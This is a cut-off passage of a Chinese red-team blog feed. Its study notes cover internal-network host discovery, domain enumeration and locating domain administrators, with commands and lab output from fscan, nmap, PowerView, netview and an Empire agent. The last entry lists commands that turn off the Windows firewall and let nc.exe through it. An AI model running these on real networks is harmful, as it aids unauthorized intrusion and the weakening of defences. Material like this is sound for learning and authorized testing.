title="12、fscan"></a>12、fscan</h2><p>影舞者大佬写的一款工具，使用起来感觉很是方便，工具下载地址：<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><pre><code>C:\Users\daniel10&gt;fscan.exe -h 192.168.7.1-255 -p 22,445   ___                              _  / _ \     ___  ___ _ __ __ _  ___| | __ / /_\/____/ __|/ __| &#39;__/ _` |/ __| |/ // /_\\_____\__ \ (__| | | (_| | (__|   &lt;\____/     |___/\___|_|  \__,_|\___|_|\_\                     fscan version: 1.5.1scan start(icmp) Target &#39;192.168.7.7&#39; is alive(icmp) Target &#39;192.168.7.110&#39; is alive(icmp) Target &#39;192.168.7.107&#39; is aliveicmp alive hosts len is: 3192.168.7.110:445 open192.168.7.7:445 open192.168.7.107:445 open192.168.7.110 CVE-2020-0796 SmbGhost Vulnerable192.168.7.110  (Windows 10 Pro 18363)[+] 192.168.7.7 MS17-010        (Windows Server 2008 R2 Datacenter 7601 Service Pack 1)[+] 192.168.7.107       MS17-010        (Windows 7 Professional 7601 Service Pack 1)scan end</code></pre><h2 id="13、Nmap"><a href="#13、Nmap" class="headerlink" title="13、Nmap"></a>13、Nmap</h2><p>提到扫描自然不能少了 nmap，nmap 支持多种协议的扫描，具体如下：</p><pre><code>ARP 扫描：            nmap -PR -sn 192.168.7.0/24ICMP 扫描：        nmap ‐sP ‐PI 192.168.7.0/24 ‐T4ICMP 扫描：        nmap ‐sn ‐PE ‐T4 192.168.7.0/24SNMP 扫描：        nmap -sU --script snmp-brute 192.168.7.0/24 -T4UDP 扫描：            nmap -sU -T5 -sV --max-retries 1 192.168.7.7 -p 500NetBIOS 扫描：    nmap --script nbstat.nse -sU -p137 192.168.7.0/24 -T4SMB 扫描：            nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p 445 192.168.7.0/24……</code></pre><h2 id="14、MSF"><a href="#14、MSF" class="headerlink" title="14、MSF"></a>14、MSF</h2><p>除了 Nmap 之外，万能的 MSF 自然也不能少，MSF 能够进行主机存活探测的模块如下：</p><pre><code>auxiliary/scanner/discovery/udp_probeauxiliary/scanner/discovery/udp_sweepauxiliary/scanner/discovery/arp_sweepauxiliary/scanner/netbios/nbnameauxiliary/scanner/snmp/snmp_enumauxiliary/scanner/smb/smb_version……</code></pre><p>除了上述工具外，还有 netdiscover、snscan 等工具可用于内网主机存活探测，在这其中有些工具因为使用起来感觉探测的不是很理想等原因，在此就不记录了，如果读者感兴趣的话可自行尝试玩玩。</p><blockquote><p>参考文章：</p><p><a href="https://soapffz.com/sec/21.html">https://soapffz.com/sec/21.html</a></p><p><a href="https://micro8.gitbook.io/micro8/contents-1">https://micro8.gitbook.io/micro8/contents-1</a></p><p><a href="https://www.cnblogs.com/xiaozi/p/13722474.html">https://www.cnblogs.com/xiaozi/p/13722474.html</a></p><p><a href="https://www.cnblogs.com/-mo-/p/11908260.html">https://www.cnblogs.com/-mo-/p/11908260.html</a></p><p><a href="https://blog.csdn.net/weixin_42918771/article/details/108798729">https://blog.csdn.net/weixin_42918771/article/details/108798729</a></p><p><a href="https://blog.csdn.net/qq_45366449/article/details/113650656">https://blog.csdn.net/qq_45366449/article/details/113650656</a></p><p><a href="https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/">https://pingmaoer.github.io/2020/03/30/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%B8%80/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;注：本文中的工具均来源自互联网，后门自查。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在进入目标域后，对域内主机进行存活探测是不可或缺的一步，在此记录一下亿些常见的方法。&lt;/p&gt;
&lt;h2 id=&quot;1、ping&quot;&gt;&lt;a href=&quot;#1、ping&quot; </summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="经验总结" scheme="https://www.teamssix.com/tags/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】4、域内信息收集</title>
    <link href="https://www.teamssix.com/year/210224-210341.html"/>
    <id>https://www.teamssix.com/year/210224-210341.html</id>
    <published>2021-02-24T13:03:41.000Z</published>
    <updated>2021-02-24T03:12:15.423Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、判断是否存在域"><a href="#1、判断是否存在域" class="headerlink" title="1、判断是否存在域"></a>1、判断是否存在域</h2><h3 id="ipconfig"><a href="#ipconfig" class="headerlink" title="ipconfig"></a>ipconfig</h3><p>查看网关 IP 地址、DNS 的 IP 地址、域名、本机是否和 DNS 服务器处于同一网段。    </p><pre><code>ipconfig /all</code></pre><pre><code>C:\Users\daniel10&gt; ipconfig /allWindows IP 配置   主 DNS 后缀 . . . . . . . . . .  : teamssix.com   DNS 后缀搜索列表  . . . . . . . . : teamssix.com以太网适配器 Ethernet0:   IPv4 地址 . . . . . . . . . . .. : 192.168.7.110   子网掩码  . . . . . . . . . . . . : 255.255.255.0   默认网关. . . . . . . . . . . . . : 192.168.7.1   DNS 服务器  . . . . . . . . . . . : 192.168.7.7</code></pre><p>接着使用 nslookup 解析域名的 IP 地址，查看是否与 DNS 服务器为同一 IP</p><pre><code>nslookup teamssix.com</code></pre><pre><code>C:\Users\daniel10&gt; nslookup teamssix.com服务器:  UnKnownAddress:  192.168.7.7名称:    teamssix.comAddress:  192.168.7.7</code></pre><h3 id="系统详细信息"><a href="#系统详细信息" class="headerlink" title="系统详细信息"></a>系统详细信息</h3><pre><code>systeminfo</code></pre><pre><code>C:\Users\daniel10&gt; systeminfo | findstr 域:域: teamssix.com</code></pre><h3 id="当前登录域与域用户"><a href="#当前登录域与域用户" class="headerlink" title="当前登录域与域用户"></a>当前登录域与域用户</h3><pre><code>net config workstation</code></pre><pre><code>C:\Users\daniel10&gt; net config workstation | findstr 域工作站域                    TEAMSSIX工作站域 DNS 名称            teamssix.com登录域                      TEAMSSIX</code></pre><h3 id="判断主域"><a href="#判断主域" class="headerlink" title="判断主域"></a>判断主域</h3><pre><code>net time /domain</code></pre><pre><code>C:\Users\daniel10&gt; net time /domain\\dc.teamssix.com 的当前时间是 2021/2/13 20:49:56命令成功完成。</code></pre><h2 id="2、收集域内基础信息"><a href="#2、收集域内基础信息" class="headerlink" title="2、收集域内基础信息"></a>2、收集域内基础信息</h2><h3 id="查看域"><a href="#查看域" class="headerlink" title="查看域"></a>查看域</h3><pre><code>net view /domain</code></pre><pre><code>C:\Users\daniel10&gt; net view /domainDomain-------------------------------------------------------------------------------TEAMSSIX命令成功完成。</code></pre><h3 id="查看域内计算机"><a href="#查看域内计算机" class="headerlink" title="查看域内计算机"></a>查看域内计算机</h3><pre><code>net view /domain:domain_name</code></pre><pre><code>C:\Users\daniel10&gt; net view /domain:teamssix服务器名称            注解-------------------------------------------------------------------------------\\DANIEL10\\DANIEL7\\DC命令成功完成。</code></pre><h3 id="查看域内用户组列表"><a href="#查看域内用户组列表" class="headerlink" title="查看域内用户组列表"></a>查看域内用户组列表</h3><pre><code>net group /domain</code></pre><pre><code>C:\Users\daniel10&gt; net group /domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的组帐户-------------------------------------------------------------------------------*Admins*Domain Admins*Domain Computers*Domain Users*Enterprise Admins命令成功完成。</code></pre><h3 id="查看域用户组信息"><a href="#查看域用户组信息" class="headerlink" title="查看域用户组信息"></a>查看域用户组信息</h3><pre><code>net group &quot;Enterprise Admins&quot; /domain</code></pre><pre><code>C:\Users\daniel10&gt; net group &quot;Enterprise Admins&quot; /domain这项请求将在域 teamssix.com 的域控制器处理。组名     Enterprise Admins注释     指定的公司系統管理員成员-------------------------------------------------------------------------------Administrator命令成功完成。</code></pre><h3 id="查看域密码策略信息"><a href="#查看域密码策略信息" class="headerlink" title="查看域密码策略信息"></a>查看域密码策略信息</h3><pre><code>net accounts /domain</code></pre><pre><code>C:\Users\daniel10&gt; net accounts /domain这项请求将在域 teamssix.com 的域控制器处理。强制用户在时间到期之后多久必须注销?:     从不密码最短使用期限(天):                  1密码最长使用期限(天):                  42密码长度最小值:                        7保持的密码历史记录长度:                 24锁定阈值:                            从不锁定持续时间(分):                      30锁定观测窗口(分):                      30计算机角色:                           PRIMARY命令成功完成。</code></pre><h3 id="查看域信任信息"><a href="#查看域信任信息" class="headerlink" title="查看域信任信息"></a>查看域信任信息</h3><pre><code>nltest /domain_trusts</code></pre><pre><code>C:\Users\daniel10&gt; nltest /domain_trusts域信任的列表:    0: TEAMSSIX teamssix.com (NT 5) (Forest Tree Root) (Primary Domain) (Native)此命令成功完成</code></pre><h2 id="3、收集域用户和管理员信息"><a href="#3、收集域用户和管理员信息" class="headerlink" title="3、收集域用户和管理员信息"></a>3、收集域用户和管理员信息</h2><h3 id="查询域用户列表"><a href="#查询域用户列表" class="headerlink" title="查询域用户列表"></a>查询域用户列表</h3><pre><code>net user /domain</code></pre><pre><code>C:\Users\daniel10&gt; net user /domain这项请求将在域 teamssix.com 的域控制器处理。\\dc.teamssix.com 的用户帐户-------------------------------------------------------------------------------admin                    Administrator                    daniel10</code></pre><h3 id="查询域用户详细信息"><a href="#查询域用户详细信息" class="headerlink" title="查询域用户详细信息"></a>查询域用户详细信息</h3><pre><code>wmic useraccount get /all</code></pre><pre><code>C:\Users\daniel10&gt; wmic useraccount get /allAccountType  Caption                        Description                                                     Disabled  Domain    FullName                               InstallDate  LocalAccount  Lockout  Name                  PasswordChangeable  PasswordExpires  PasswordRequired  SID                                            SIDType  Status512          DANIEL10\Administrator         管理计算机(域)的内置帐户                                        TRUE      DANIEL10                                                      TRUE          FALSE    Administrator         TRUE                FALSE            TRUE              S-1-5-21-1097120846-822447287-3576165687-500   1        Degraded512          DANIEL10\DefaultAccount        系统管理的用户帐户。                                            TRUE      DANIEL10                                                      TRUE          FALSE    DefaultAccount        TRUE                FALSE            FALSE             S-1-5-21-1097120846-822447287-3576165687-503   1        Degraded</code></pre><h3 id="查询存在的用户"><a href="#查询存在的用户" class="headerlink" title="查询存在的用户"></a>查询存在的用户</h3><pre><code>dsquery user</code></pre><pre><code>C:\Users\daniel10&gt; dsquery user&quot;CN=Administrator,CN=Users,DC=teamssix,DC=com&quot;&quot;CN=Guest,CN=Users,DC=teamssix,DC=com&quot;</code></pre><p>常用的 dsquery 命令</p><pre><code>dsquery computer - 查找目录中的计算机dsquery contact - 查找目录中的联系人dsquery subnet - 查找目录中的子网dsquery group - 查找目录中的组dsquery ou - 查找目录中的组织单位dsquery site - 查找目录中的站点dsquery server - 查找目录中的域控制器dsquery user - 查找目录中的用户dsquery quota - 查找目录中的配额dsquery partition - 查找目录中的分区dsquery * - 用通用的 LDAP 查询查找目录中的任何对象</code></pre><h2 id="4、查找域控制器"><a href="#4、查找域控制器" class="headerlink" title="4、查找域控制器"></a>4、查找域控制器</h2><h3 id="查看域控器机器名"><a href="#查看域控器机器名" class="headerlink" title="查看域控器机器名"></a>查看域控器机器名</h3><pre><code>nltest /DCLIST:teamssix</code></pre><pre><code>C:\Users\daniel10&gt; nltest /DCLIST:teamssix获得域“teamssix”中 DC 的列表(从“\\DC”中)。    dc.teamssix.com [PDC]  [DS] 站点: Default-First-Site-Name此命令成功完成</code></pre><h3 id="查看域控器主机名"><a href="#查看域控器主机名" class="headerlink" title="查看域控器主机名"></a>查看域控器主机名</h3><pre><code>nslookup -type=SRV _ldap._tcp</code></pre><pre><code>C:\Users\daniel10&gt; nslookup -type=SRV _ldap._tcp_ldap._tcp.teamssix.com SRV service location:          priority       = 0          weight         = 100          port           = 389          svr hostname   = dc.teamssix.comdc.teamssix.com internet address = 192.168.7.7</code></pre><pre><code>netdom query pdc</code></pre><pre><code>C:\Users\daniel10&gt; netdom query pdc域的主域控制器:DC命令成功完成。</code></pre><h3 id="查看域控器组"><a href="#查看域控器组" class="headerlink" title="查看域控器组"></a>查看域控器组</h3><pre><code>net group &quot;domain controllers&quot; /domain</code></pre><pre><code>C:\Users\daniel10&gt; net group &quot;domain controllers&quot; /domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Controllers注释     在網域所有的網域控制站成员-------------------------------------------------------------------------------DC$命令成功完成。</code></pre><h2 id="5、定位域管理员"><a href="#5、定位域管理员" class="headerlink" title="5、定位域管理员"></a>5、定位域管理员</h2><h3 id="psloggedon"><a href="#psloggedon" class="headerlink" title="psloggedon"></a>psloggedon</h3><p>在 Windows 上使用 <code>net session</code> 可以查看谁使用了本机资源，但不能查看谁在使用远程计算机资源、谁登录了本地或远程计算机，使用 psloggedon 可以查看本地登录的用户和通过本地计算机或远程计算机进行资源登录的用户。</p><p>psloggedon 下载地址：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon">https://docs.microsoft.com/en-us/sysinternals/downloads/psloggedon</a></p><pre><code>psloggedon.exe [-] [-l] [-x] [\\computername|username]-                                显示支持的选项和用于输出值的单位。-l                            仅显示本地登录，不显示本地和网络资源登录。-x                            不显示登录时间。\\computername    指定要列出登录信息的计算机的名称。Username                指定用户名，在网络中搜索该用户登录的计算机。</code></pre><pre><code>C:\Users\daniel10&gt; PsLoggedon.exe -l \\192.168.7.7Users logged on locally:2021/2/13 20:53:08         TEAMSSIX\Administrator</code></pre><h3 id="PVEFindADUser"><a href="#PVEFindADUser" class="headerlink" title="PVEFindADUser"></a>PVEFindADUser</h3><p>PVEFindADUser 用于查找活动目录用户登录的位置、枚举域用户，以及查找在特定计算机上登录的用户，包括本地用户、通过 RDP 登录的用户、用于运行服务器和计划任务的用户，该工具需要管理员权限。</p><p>PVEFindADUser 下载地址：<a href="https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn">https://github.com/chrisdee/Tools/tree/master/AD/ADFindUsersLoggedOn</a></p><pre><code>-h                                            显示帮助信息-u                                            检测程序是否有新版本-current [&quot;username&quot;]        -current参数显示每台PC上当前登录的用户在域中。如果指定用户名（在引号之间），则仅将显示该特定用户登录的PC-noping                                    阻止尝试枚举用户登录名之前对目标计算机执行ping命令-target                                    此可选参数允许您指定要查询的主机。如果未指定此-target参数，则将查询当前域中的所有主机。如果决定指定-target，然后指定以逗号分隔的主机名。查询结果将被输出到report.csv文件中</code></pre><pre><code>C:\Users\daniel10&gt; PVEFindADUser.exe -current [+] Finding currently logged on users ? true [+] Finding last logged on users ? false [+] Enumerating all computers... [+] Number of computers found : 15 [+] Launching queries     [+] Processing host : dc.teamssix.com (Windows Server 2008 R2 Datacenter;Service Pack 1)         - Logged on user : teamssix\administrator     [+] Processing host : daniel7.teamssix.com (Windows 7 专业版;Service Pack 1)     [+] Processing host : daniel10.teamssix.com (Windows 10 专业版) [+] Report written to report.csv</code></pre><h3 id="netview"><a href="#netview" class="headerlink" title="netview"></a>netview</h3><p>netview 是一个枚举工具，使用 WinAPI 枚举系统，利用 NetSessionEnum 寻找登录会话，利用 NetShareEnum 寻找共享，利用 NetWkstaUserEnum 枚举登录的用户，netview 可以查询共享入口和有价值的用户，其绝大部分功能无需管理员权限就可使用。</p><p>Netview 下载地址：<a href="https://github.com/mubix/netview">https://github.com/mubix/netview</a></p><pre><code>-h               显示帮助信息-f filename.txt  指定要提取主机列表的文件-e filename.txt  指定要排除的主机名的文件-o filename.txt  将所有输出重定向到指定的文件-d domain        指定要提取主机列表的域。如果没有指定，则从当前域中提取主机列表-g group         指定搜索的组名。如果没有指定，则在Domain Admins组中搜索-c               对已找到的共享目录/文件的访问权限进行检查-i interval      枚举主机之间等待的秒数-j jitter        应用于间隔的抖动百分比（0.0-1.0）</code></pre><pre><code>C:\Users\daniel10&gt; netview.exe -d[+] Number of hosts: 3[+] Host: DANIEL10Enumerating AD Info[+] DANIEL10 - Comment -[+] D - OS Version - 10.0[+] DANIEL10 - MSSQL ServerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.110Enumerating Share InfoEnumerating Session InfoEnumerating Logged-on Users[+] DANIEL10 - Logged-on - TEAMSSIX\daniel10[+] Host: DCEnumerating AD Info[+] DC - Comment -[+] D - OS Version - 6.1[+] DC - Domain ControllerEnumerating IP Info[+] (null) - IPv4 Address - 192.168.7.7……内容较多故省略……</code></pre><h3 id="NSE-脚本"><a href="#NSE-脚本" class="headerlink" title="NSE 脚本"></a>NSE 脚本</h3><p>常用的 NSE 脚本如下：</p><p><code>smb-enum-domains.nse</code>:对域控制器进行信息收集，可以获取主机信息、用户、可使用密码策略的用户等</p><p><code>smb-enum-users.nse</code>:在进行域渗透时，如获取了域内某台主机权限，但权限有限，无法获取更多的域用户信息，可借助此脚本对域控制器进行扫描</p><p><code>smb-enum-shares.nse</code>:遍历远程主机的共享目录</p><p><code>smb-enum-processes.nse</code>:对主机的系统进程进行遍历，通过此信息，可知道目标主机运行着哪些软件</p><p><code>smb-enum-sessions.nse</code>:获取域内主机的用户登陆会话，查看当前是否有用户登陆，且不需要管理员权限</p><p><code>smb-os-discovery.nse</code>:收集目标主机的操作系统、计算机名、域名、域林名称、NetBIOS机器名、NetBIOS域名、工作组、系统时间等信息</p><p>NES 脚本下载地址：<a href="https://nmap.org/nsedoc/scripts/">https://nmap.org/nsedoc/scripts/</a></p><pre><code>C:\Users\daniel10&gt; nmap --script=smb-os-discovery.nse -p 445 192.168.7.107Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-21 09:44 CSTNmap scan report for 192.168.7.107Host is up (0.00053s latency).PORT    STATE SERVICE445/tcp open  microsoft-dsHost script results:| smb-os-discovery:|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional|   Computer name: daniel7|   NetBIOS computer name: DANIEL7\x00|   Domain name: teamssix.com|   Forest name: teamssix.com|   FQDN: daniel7.teamssix.com|_  System time: 2021-02-21T09:44:33+08:00Nmap done: 1 IP address (1 host up) scanned in 0.50 seconds</code></pre><p> <img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/Snipaste_2021-02-23_17-38-11.png"></p><h3 id="PowerView-脚本"><a href="#PowerView-脚本" class="headerlink" title="PowerView 脚本"></a>PowerView 脚本</h3><p>PowerView 脚本中包含了一系列的 powershell 脚本，信息收集相关的脚本有 Invoke-StealthUserHunter、Invoke-UserHunter 等，要使用 PowerView 脚本需要将 PowerView 文件夹复制到 PowerShell 的 Module 文件夹内， Module 文件夹路径可以通过在 PowerShell 中输入<code> $Env:PSModulePath</code>查看，我这里将其复制到了C:\Program Files\WindowsPowerShell\Modules文件夹内。</p><p>接着在 powershell中输入<code> Import-Module PowerView</code>即可导入PowerView，使用<code> Get-Command -Module PowerView</code>可查看已导入的 PowerView 命令</p><pre><code>PS C:\Users\daniel10&gt; Import-Module PowerViewPS C:\Users\daniel10&gt; Get-Command -Module PowerViewCommandType     Name                                               Version    Source-----------     ----                                               -------    ------Alias           Find-UserTrustGroup                                1.0        PowerViewAlias           Get-ComputerProperties                             1.0        PowerView……内容较多故省略……</code></pre><p>PowerView 脚本下载地址：<a href="https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView">https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerView</a></p><blockquote><p>注：在打开上面的下载地址时会看到该项目已被转移到其他项目下，但是当我在使用新版本的 PowerView 脚本时，发现找不到<code>Invoke-StealthUserHunter</code>命令，而旧版本的 PowerView 有<code>Invoke-StealthUserHunter</code>命令</p></blockquote><p><strong>Invoke-StealthUserHunter</strong>：只需要进行一次查询，就可以获取域里面的所有用户。其原理为：从<code>user.HomeDirectories</code>中提取所有用户，并对每个服务器进行<code>Get-NetSession</code>获取。因不需要使用<code>Invoke-UserHunter</code>对每台机器进行操作，所以这个方法的隐蔽性相对较高（但涉及的机器不一定全面）。PowerView 默认使用<code>Invoke-StealthUserHunter</code>如果找不到需要的信息，就会使用<code>Invoke-UserHunter</code>.</p><p><strong>Invoke-UserHunter</strong>：找到域内特定的用户群，接受用户名、用户列表和域组查询，接收一个主机列表或查询可用的主机域名。使用<code>Get-NetSession</code>和<code>Get-NetLoggedon</code>(调用 NetSessionEnum 和 NetWkstaUserEnumAPI )扫描每台服务器并对扫描结果进行比较，从而找出目标用户集，在使用时不需要管理员权限。</p><pre><code>PS C:\Users\daniel10&gt; Invoke-UserHunterUserDomain   : TEAMSSIXUserName     : AdministratorComputerName : dc.teamssix.comIP           : 192.168.7.7SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : daniel10ComputerName : daniel10.teamssix.comIP           : 192.168.7.110SessionFrom  :LocalAdmin   :UserDomain   : TEAMSSIXUserName     : AdministratorComputerName : daniel7.teamssix.comIP           : 192.168.7.107SessionFrom  :LocalAdmin   :</code></pre><p>PowerView 中的其他信息收集模块：</p><ul><li>Get-NetDomain:获取当前用户所在域名称</li><li>Get-NetUser：获取所有用户的详细信息</li><li>Get-NetDomainController：获取所有域控制器的信息</li><li>Get-NetComputer：获取域内所有机器的详细信息</li><li>Get-NetOU：获取域中的OU信息</li><li>Get-NetGroup：获取所有域内组和组成员信息</li><li>Get-NetFileServer：根据SPN获取当前域使用的文件服务器信息</li><li>Get-NetShare：获取当前域内所有的网络共享信息</li><li>Get-NetSession：获取指定服务器的会话</li><li>Get-NetRDPSession：获取指定服务器的远程连接</li><li>Get-NetProcess：获取远程主机的进程</li><li>Get-UserEvent：获取指定用户的日志</li><li>Get-ADObject：获取活动目录的对象</li><li>Get-NetGPO：获取域内所有组的策略对象</li><li>Get-DomainPolicy：获取域默认策略或域控制器策略</li><li>Invoke-UserHunter：获取域用户登陆的计算机信息及该用户是否有本地管理员权限</li><li>Invoke-ProcessHunter：通过查询域内所有的机器进程找到特定用户</li><li>Invoke-UserEventHunter：根据用户日志查询某域用户登陆过哪些域机器</li></ul><h3 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h3><p>Empire中的<code>user_hunter</code>模块用于查找域管理员登陆的机器，使用 powershell/situational_awareness/network/powerview/user_hunter 模块，可查看哪个用户登陆哪台主机。</p><pre><code>(Empire: listeners) &gt; agents[*] Active agents: Name     La Internal IP     Machine Name      Username                Process            PID    Delay    Last Seen ----     -- -----------     ------------      --------                -------            ---    -----    --------- 3XRCWAB2 ps 192.168.7.7     DC                *TEAMSSIX\administrator powershell         2256   5/0.0    2021-02-22 20:39:54(Empire: agents) &gt; usemodule powershell/powershell/situational_awareness/network/powerview/user_hunter(Empire: powershell/situational_awareness/network/powerview/user_hunter) &gt; set Agent 3XRCWAB2(Empire: powershell/situational_awareness/network/powerview/user_hunter) &gt; execute[*] Tasked 3XRCWAB2 to run TASK_CMD_JOB[*] Agent 3XRCWAB2 tasked with task ID 1[*] Tasked agent 3XRCWAB2 to run module powershell/situational_awareness/network/powerview/user_hunter[*] Valid results returned by 192.168.7.7……</code></pre><h2 id="6、查找域管理员进程"><a href="#6、查找域管理员进程" class="headerlink" title="6、查找域管理员进程"></a>6、查找域管理员进程</h2><h3 id="获取域管理员列表"><a href="#获取域管理员列表" class="headerlink" title="获取域管理员列表"></a>获取域管理员列表</h3><pre><code>net group &quot;Domain Admins&quot; /domain</code></pre><pre><code>C:\Users\daniel10&gt;net group &quot;Domain Admins&quot; /domain这项请求将在域 teamssix.com 的域控制器处理。组名     Domain Admins注释     指定的域管理员成员-------------------------------------------------------------------------------Administrator命令成功完成。</code></pre><h3 id="列出本机的所有进程及进程用户"><a href="#列出本机的所有进程及进程用户" class="headerlink" title="列出本机的所有进程及进程用户"></a>列出本机的所有进程及进程用户</h3><pre><code>tasklist /v</code></pre><pre><code>C:\Users\daniel10&gt;tasklist /v映像名称                       PID 会话名              会话#       内存使用  状态            用户名                                                 CPU 时间 窗口标题========================= ======== ================ =========== ============ =============== ================================================== ============ ========================================================================System Idle Process              0 Services                   0          8 K Unknown         NT AUTHORITY\SYSTEM                                    68:35:16 暂缺System                           4 Services                   0        924 K Unknown         暂缺                                                    0:24:14 暂缺svchost.exe                   9228 Console                    2      2,932 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺tasklist.exe                 10768 Console                    2      9,540 K Unknown         TEAMSSIX\daniel10                                       0:00:00 暂缺……内容过多省略……</code></pre><p>如果在列出的进程中看到了用户名为管理员用户名的话，便是找到了域管理员进程。</p><blockquote><p>参考链接：</p><p><a href="https://blog.csdn.net/qq_36279445/article/details/110647055">https://blog.csdn.net/qq_36279445/article/details/110647055</a></p><p><a href="https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/">https://pingmaoer.github.io/2020/03/31/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E4%BA%8C/</a></p><p>更多信息欢迎关注我的微信公众号：TeamsSix</p></blockquote><p><img src="https://teamssix.oss-cn-hangzhou.aliyuncs.com/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;1、判断是否存在域&quot;&gt;&lt;a href=&quot;#1、判断是否存在域&quot; class=&quot;headerlink&quot; title=&quot;1、判断是否存在域&quot;&gt;&lt;/a&gt;1、判断是否存在域&lt;/h2&gt;&lt;h3 id=&quot;ipconfig&quot;&gt;&lt;a href=&quot;#ipconfig&quot; class=&quot;</summary>
      
    
    
    
    <category term="内网学习笔记" scheme="https://www.teamssix.com/categories/%E5%86%85%E7%BD%91%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="学习笔记" scheme="https://www.teamssix.com/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    <category term="红队" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="内网" scheme="https://www.teamssix.com/tags/%E5%86%85%E7%BD%91/"/>
    
  </entry>
  
  <entry>
    <title>【内网学习笔记】3、本地工作组信息收集</title>
    <link href="https://www.teamssix.com/year/210211-160909.html"/>
    <id>https://www.teamssix.com/year/210211-160909.html</id>
    <published>2021-02-11T08:09:09.000Z</published>
    <updated>2021-02-11T08:35:00.687Z</updated>
    
    <content type="html"><![CDATA[<h2 id="1、手动收集本地工作组信息"><a href="#1、手动收集本地工作组信息" class="headerlink" title="1、手动收集本地工作组信息"></a>1、手动收集本地工作组信息</h2><ul><li>查看当前权限</li></ul><pre><code>whoami </code></pre><ul><li>本机网络配置信息</li></ul><pre><code>ipconfig /all</code></pre><ul><li>操作系统和版本信息（英文版）</li></ul><pre><code>systeminfo | findstr /B /C:&quot;OS Name&quot; /C:&quot;OS Version&quot; </code></pre><ul><li>操作系统和版本信息（中文版）</li></ul><pre><code>systeminfo | findstr /B /C:&quot;OS 名称&quot; /C:&quot;OS 版本&quot;</code></pre><ul><li>查看系统体系结构</li></ul><pre><code>echo %PROCESSOR_ARCHITECTURE%</code></pre><ul><li>查看系统所有环境变量</li></ul><pre><code>set</code></pre><ul><li>查看安装的软件及版本和路径等信息</li></ul><pre><code>wmic product get name,version</code></pre><ul><li>利用 PowerShell 收集软件版本信息</li></ul><pre><code>powershell &quot;Get-WmiObject -class Win32_Product |Select-Object -Property name,version&quot;</code></pre><ul><li>查询本机服务信息</li></ul><pre><code>wmic service list brief</code></pre><ul><li>查询进程列表</li></ul><pre><code>tasklist /v</code></pre><ul><li>wmic 查看进程信息</li></ul><pre><code>wmic process list brief</code></pre><ul><li>查看启动程序信息</li></ul><pre><code>wmic startup get command,caption</code></pre><ul><li>查看计划任务</li></ul><pre><code>schtasks /query /fo LIST /v</code></pre><ul><li>查看主机开启时间</li></ul><pre><code>net statistics workstation</code></pre><ul><li>查询用户列表</li></ul><pre><code>net user</code></pre><ul><li> 查看指定用户的信息</li></ul><pre><code>net user teamssix</code></pre><ul><li> 查看本地管理员用户</li></ul><pre><code>net localgroup administrators</code></pre><ul><li>查看当前在线用户</li></ul><pre><code>query user || qwinsta</code></pre><ul><li>列出或断开本地计算机和连接的客户端的会话 </li></ul><pre><code>net session</code></pre><ul><li>查看端口列表</li></ul><pre><code>netstat –ano</code></pre><ul><li>查看补丁列表</li></ul><pre><code>systeminfo</code></pre><ul><li>使用 wmic 查看补丁列表</li></ul><pre><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></pre><ul><li>查看本机共享</li></ul><pre><code>net share</code></pre><ul><li>使用 wmic 查看共享列表</li></ul><pre><code>wmic share get name,path,status</code></pre><ul><li>查询路由表及所有可用接口的ARP 缓存表 </li></ul><pre><code>route printarp –a</code></pre><ul><li><p>查询防火墙相关配置 </p><ul><li>关闭防火墙</li></ul><pre><code>netsh firewall set opmode disable (Windows Server 2003 系统及之前版本)netsh advfirewall set allprofiles state off    (Windows Server 2003 系统及之后版本)</code></pre><ul><li>查看防火墙配置</li></ul><pre><code>netsh firewall show config</code></pre><ul><li>修改防火墙配置</li></ul><pre><code>(Windows Server 2003 系统及之前版本)允许指定程序全部连接netsh firewall add allowedprogram c:\nc.exe &quot;allow nc&quot; enable(Windows Server 2003 之后系统版本)允许指定程序连入netsh advfirewall firewall add rule name=&quot;pass nc&quot; dir=in action=allow program=&quot;C: 